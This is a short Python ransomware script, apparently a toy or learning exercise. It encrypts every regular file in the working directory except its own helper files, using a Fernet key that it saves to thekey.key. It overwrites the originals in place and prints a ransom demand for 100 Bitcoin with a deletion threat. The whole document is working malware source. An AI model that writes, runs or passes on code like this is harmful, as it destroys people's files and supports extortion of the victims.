#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if  file=="decrypt.py" or file=="thekey.key" or file=="encrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key=Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as f:
       contents= f.read()
    contents_encrypted=Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("\nAll of your files has been encrypted!!! Send me 100 Bitcoin or I'll delete it in 24 hours!!!!!")
